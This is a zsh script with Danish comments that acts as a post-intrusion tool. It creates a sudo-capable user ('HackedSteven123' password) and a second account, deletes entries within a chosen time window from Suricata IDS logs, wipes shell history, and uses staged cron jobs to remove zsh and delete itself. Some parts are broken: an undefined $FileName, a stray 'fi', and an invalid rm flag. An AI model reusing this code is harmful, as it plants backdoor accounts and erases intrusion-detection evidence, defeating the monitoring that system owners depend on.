#!/usr/bin/env zsh
# =================== KONFIGURATION ===================
Stage="$1"
DefaultFormat="DD/MM/YYYY-THH:MM:SS:MSMSMS"
AmbiguousDatePolicy="EU"
CUser=("Steven" "Bo")
CPasswd=("HackedSteven123" "RegularUserBo123")
CSudo=("True" "False")
Cleanup="False"
Debug="True"
StartEditPoint="16/12/2025-13:25:00.000000"
EndEditPoint="16/12/2025-13:28:00.000000"
ListOfFiles=(
    /var/log/suricata/eve.json
    /var/log/suricata/suricata.log
    /var/log/suricata/fast.log
    /var/log/suricata/stats.log
)

if [[ "$Stage" == "Stage1" ]]; then
    CronTid=$(date -d 'now + 3 minutes' '+%d/%m/%Y-%H:%M:%S.%6N')
    sed -i "s|EndEditPoint=\"[^\"]*\"|EndEditPoint=\"$CronTid\"|" "$FileName"
    sudo chmod +x $FileName
    Stage2File="$FileName Stage2"
    (crontab -l | grep -v "$Stage2File") | crontab -
fi

if [[ "$Stage" == "Stage3" ]]; then
    sudo apt remove -y zsh
    sudo apt autoremove -y
    sudo rm "$FileName" -y
fi

if [[ "$Stage" == "Stage2" ]]; then   
    echo "testing $EndEditPoint"
    Stage3File="$FileName Stage3"
    (crontab -l | grep -v "$Stage3File") | crontab -
fi
    # =================== USER CLEANUP ===================

    if [[ "$Cleanup" == "True" ]]; then
        for User in "${CUser[@]}"; do
            sudo killall -u "$User" 2>/dev/null
            sudo userdel -r "$User" 2>/dev/null
        done
        exit 0
    fi

    # =================== DATE FORMAT DETECTION ===================

    DetectDateFormat() {
        local DateString="$1"

        if [[ "$DateString" =~ ^[0-9]{4}-[0-9]{1,2}-[0-9]{1,2}T ]]; then
            echo "IsoYmd"
        elif [[ "$DateString" =~ ^[0-9]{4}/[0-9]{1,2}/[0-9]{1,2} ]]; then
            echo "YmdSlash"
        elif [[ "$DateString" =~ ^[0-9]{1,2}/[0-9]{1,2}/[0-9]{4} ]]; then
            echo "Ambiguous"
        else
            echo "Unknown"
        fi
    }

    # =================== SPLIT FUNCTION ===================

    SplitFunction() {
        local RawDate="$1"
        [[ -z "$RawDate" ]] && RawDate="$DefaultFormat"

        RawDate="${RawDate%Z}"
        RawDate="${RawDate%%[+-][0-9][0-9]:[0-9][0-9]}"

        local Format
        Format=$(DetectDateFormat "$RawDate")

        local Cleaned="${RawDate//T/ }"
        Cleaned="${Cleaned//[-\/:]/ }"
        Cleaned="${Cleaned//./ }"
        local Parts=("${=Cleaned}")

        local Year Month Day HH MI SS
        HH="${Parts[4]:-00}"
        MI="${Parts[5]:-00}"
        SS="${Parts[6]:-00}"

        case "$Format" in
            IsoYmd|YmdSlash)
                Year="${Parts[1]}"
                Month="${Parts[2]}"
                Day="${Parts[3]}"
                ;;
            Ambiguous)
                if [[ "$AmbiguousDatePolicy" == "EU" ]]; then
                    Day="${Parts[1]}"
                    Month="${Parts[2]}"
                    Year="${Parts[3]}"
                else
                    Month="${Parts[1]}"
                    Day="${Parts[2]}"
                    Year="${Parts[3]}"
                fi
                ;;
            *)
                # HARD FAILOVER – INGEN GÆT
                Year="1970"; Month="01"; Day="01"
                HH="00"; MI="00"; SS="00"
                ;;
        esac

        printf "%04d%02d%02d%02d%02d%02d" \
            "$Year" "$Month" "$Day" "$HH" "$MI" "$SS"
    }

    # =================== LOG FILTER ===================

    DateRegex='([0-9]{4}-[0-9]{1,2}-[0-9]{1,2}T[0-9]{2}:[0-9]{2}:[0-9]{2}(\.[0-9]{1,6})?([+-][0-9]{2}:[0-9]{2})?|[0-9]{1,2}/[0-9]{1,2}/[0-9]{4}[ T-][0-9]{1,2}:[0-9]{1,2}:[0-9]{1,2}(\.[0-9]{1,6})?)'

    EditLogs() {
        local VarFile="$1"
        [[ ! -f "$VarFile" ]] && return

        local StartNum EndNum
        StartNum=$(SplitFunction "$StartEditPoint")
        EndNum=$(SplitFunction "$EndEditPoint")

        local TempFile
        TempFile=$(mktemp)

        [[ "$Debug" == "True" ]] && {
            echo ""
            echo "--- FILTERING: $VarFile ---"
            echo "Interval: $StartNum → $EndNum"
        }

        while IFS= read -r Line || [[ -n "$Line" ]]; do
            if [[ "$Line" =~ $DateRegex ]]; then
                local LineDate="${match[1]}"
                local LineNum
                LineNum=$(SplitFunction "$LineDate")

                if (( LineNum < StartNum || LineNum > EndNum )); then
                    echo "$Line" >> "$TempFile"
                else
                    [[ "$Debug" == "True" ]] && echo "REMOVED: $Line"
                fi
            else
                echo "$Line" >> "$TempFile"
            fi
        done < "$VarFile"

        mv "$TempFile" "$VarFile"
    }

    # =================== CLEANUP FUNCTION ===================

    CleanUpFunction() {
        local TargetFiles=("$@")
        local FoundPaths=()

        for Target in "${TargetFiles[@]}"; do
            if [[ "$Target" == *.* ]]; then
                FoundPaths+=($(sudo find / -type f -name "$Target" 2>/dev/null))
            elif [[ -e "$Target" ]]; then
                FoundPaths+=("$Target")
            fi
        done

        for Path in "${FoundPaths[@]}"; do
            [[ -f "$Path" ]] && echo "Deleting file: $Path"
            [[ -d "$Path" ]] && echo "Deleting dir: $Path"
        done
    }

    # =================== CREATE USERS ===================

    CreatingUsers() {
        local Users=("${CUser[@]}")
        local Passwds=("${CPasswd[@]}")
        local Sudos=("${CSudo[@]}")

        for ((i=1; i<=${#Users[@]}; i++)); do
            sudo useradd -m -s "$SHELL" "${Users[$i]}"
            echo "${Users[$i]}:${Passwds[$i]}" | sudo chpasswd
            [[ "${Sudos[$i]}" == "True" ]] && sudo usermod -aG sudo "${Users[$i]}"
        done
    }

    # =================== CLEAR HISTORY ===================

    ClearHistory() {
        local ShellPath
        ShellPath=$(which "$SHELL")
        local HistoryFile
        HistoryFile=$("$ShellPath" -ic 'echo $HISTFILE')
        "$ShellPath" -ic "cat /dev/null > $HistoryFile"
    }

    # =================== RUN ===================

    CreatingUsers
    for File in "${ListOfFiles[@]}"; do
        EditLogs "$File"
    done
    CleanUpFunction "$@"
    ClearHistory
fi